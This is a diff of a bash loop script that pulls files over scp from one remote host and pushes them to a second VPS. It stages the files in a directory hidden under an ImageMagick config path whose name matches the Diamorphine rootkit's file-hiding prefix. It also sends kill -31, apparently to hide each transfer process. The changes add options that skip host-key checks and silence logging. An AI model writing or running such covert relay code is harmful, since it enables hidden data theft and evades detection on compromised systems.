@@ -69,7 +69,7 @@ while true; do
             if [ $GREP_RESULT -ne 0 ]; then
                 LOCAL_PATH="/etc/ImageMagick6/ImageMagick-6/diamorphine_secret_O3V1KbSCIm44nBw/up/${FILENAME}"
                 
-                /usr/bin/scp -i /home/lemon/.ssh/id_rsa -o BatchMode=yes -o ConnectTimeout=30 "${REMOTE_USER}@${REMOTE_HOST}:${REMOTE_PATH}" "${LOCAL_PATH}" >/dev/null 2>&1 &
+                /usr/bin/scp -i /home/lemon/.ssh/id_rsa -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=30 "${REMOTE_USER}@${REMOTE_HOST}:${REMOTE_PATH}" "${LOCAL_PATH}" >/dev/null 2>&1 &
                 SCP_DOWNLOAD_PID=$!
 
                 kill -31 "${SCP_DOWNLOAD_PID}" >/dev/null 2>&1
@@ -86,7 +86,7 @@ while true; do
                 if [ -f "${LOCAL_PATH}" ]; then
                     SECOND_VPS_PATH="${SECOND_VPS_DIR}${FILENAME}"
                     
-                    /usr/bin/scp -i /home/lemon/.ssh/id_rsa -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=30 "${LOCAL_PATH}" "${SECOND_VPS_USER}@${SECOND_VPS_HOST}:${SECOND_VPS_PATH}" >/dev/null 2>&1 &
+                    /usr/bin/scp -i /home/lemon/.ssh/id_rsa -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=30 "${LOCAL_PATH}" "${SECOND_VPS_USER}@${SECOND_VPS_HOST}:${SECOND_VPS_PATH}" >/dev/null 2>&1 &
                     SCP_UPLOAD_PID=$!
 
                     kill -31 "${SCP_UPLOAD_PID}" >/dev/null 2>&1
